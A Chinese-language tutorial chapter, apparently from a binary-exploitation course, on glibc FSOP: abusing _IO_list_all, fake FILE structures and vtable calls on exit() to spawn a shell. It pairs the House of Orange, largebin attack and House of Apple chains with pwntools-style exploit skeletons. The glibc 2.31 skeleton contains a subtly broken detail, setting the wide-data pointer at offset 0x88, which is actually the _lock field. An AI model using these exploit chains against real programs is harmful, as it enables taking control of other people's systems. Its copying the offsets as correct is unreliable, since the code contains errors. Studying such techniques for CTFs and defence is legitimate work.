# 第 7 章 FSOP：从原理到 getshell

> FSOP（File Structure Oriented Programming）是 IO_FILE 利用的总纲。这一章我们把 `_IO_list_all` 链表的操控讲透。

---

## 7.1 _IO_list_all 与 FILE 链表

glibc 维护一个全局链表，串联所有打开的 FILE 结构：

```c
struct _IO_FILE_plus {
    FILE file;
    const struct _IO_jump_t *vtable;
};

// 全局变量
extern struct _IO_FILE_plus *_IO_list_all;
```

链表结构：

```text
_IO_list_all → stderr → stdout → stdin → NULL
     │           │         │        │
     │           └─────────┴────────┴── _chain 字段连接
```

每个 FILE 的 `_chain` 字段（偏移 0x68）指向下一个 FILE。

---

## 7.2 _IO_flush_all_lockp 的调用链

当程序调用 `exit()` 时：

```c
// exit.c
void exit(int status) {
    ...
    _IO_cleanup();
    ...
}

// genops.c
int _IO_flush_all_lockp (int do_lock) {
    FILE *fp;
    for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain) {
        if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
             || ...)) {
            _IO_OVERFLOW (fp, EOF);   // ← 通过 vtable 间接调用！
        }
        ...
    }
}
```

**关键**：`_IO_OVERFLOW(fp, EOF)` 会通过 FILE 的 vtable 调用 `_overflow` 函数。如果伪造 FILE 的 vtable，就能劫持控制流。

### 7.2.1 触发 overflow 的条件

```c
fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
```

伪造 FILE 时要满足这个条件（设置 `_mode = 0`，`_IO_write_ptr > _IO_write_base`）。

---

## 7.3 传统 FSOP（glibc 2.23）

在 vtable 检查引入之前，可以直接把 vtable 指针指向伪造的 vtable：

```python
fake_vtable = {
    '__overflow': system_addr,
}

fake_file = flat({
    0x00: b'/bin/sh\x00',       # _flags = "/bin/sh"（system 的参数）
    0x20: 0,                    # _IO_write_base
    0x28: 1,                    # _IO_write_ptr（> base，触发 overflow）
    0x68: 0,                    # _chain
    0xd8: fake_vtable_addr,     # vtable 指向伪造的 vtable
})
```

exit 时调用 `system("/bin/sh")` → getshell。

---

## 7.4 vtable 检查（2.24+）与绕过

glibc 2.24 加入：

```c
if (__glibc_unlikely (!IO_validate_vtable (vtable))) {
    return NULL;
}
```

检查 vtable 指针是否在 `__libc_IO_vtables` 段内。

**绕过思路**：

1. **House of Orange**：先把一个 chunk 放入 unsorted bin，再用 largebin attack 修改 `_IO_list_all` 指向堆上的伪造 FILE
2. **House of Apple**：利用 `_IO_wfile_jumps`（合法 vtable）内部的二次跳转
3. **修改合法 vtable 的内容**：如果 vtable 所在的内存可写（通常不可写）

---

## 7.5 完整的 FSOP 利用（glibc 2.31）

结合 House of Orange + largebin attack + FSOP：

```text
1. House of Orange：修改 top chunk size → 触发 sysmalloc → unsorted bin 出现 chunk
2. 泄露 libc（unsorted bin fd 指向 main_arena）
3. 修改 unsorted bin chunk 的 bk → largebin attack → _IO_list_all = fake_file
4. fake_file 布置在堆上，vtable 指向 _IO_wfile_jumps
5. 程序退出 → _IO_flush_all_lockp → _IO_wfile_overflow → ... → getshell
```

### 7.5.1 关键代码框架

```python
# 1. 泄露 libc
# ...（House of Orange 后 unsorted bin leak）

# 2. 布置 fake FILE 在堆上
fake_file_addr = heap_base + 0x...
fake_wide_data = fake_file_addr + 0x100

fake_file = flat({
    0x00: 0xfbad1800,
    0x20: 0,
    0x28: 1,
    0x68: 0,
    0x88: fake_wide_data,
    0xd8: libc.sym['_IO_wfile_jumps'],
})

fake_wide = flat({
    0xe0: libc_base + one_gadget,
})

# 3. largebin attack 修改 _IO_list_all
# ...（构造 largebin attack 的 chunk）

# 4. 触发 exit
p.sendline(b'exit')
p.interactive()
```

---

## 7.6 小结

这一章我们系统学习了 FSOP：

- `_IO_list_all` 是所有 FILE 结构的链表头
- `exit()` → `_IO_flush_all_lockp` → 遍历链表 → `_IO_OVERFLOW`（vtable 调用）
- vtable 检查（2.24+）让传统 FSOP 失效，需要 House of Apple 等绕过
- 完整的 FSOP 链：House of Orange → 泄露 → largebin attack 改 _IO_list_all → 伪造 FILE → getshell

下一章我们深入 largebin attack，这是修改 `_IO_list_all` 的关键技术。

---

**下一章**：[largebin attack 深入](./ch08-largebin深入.md)
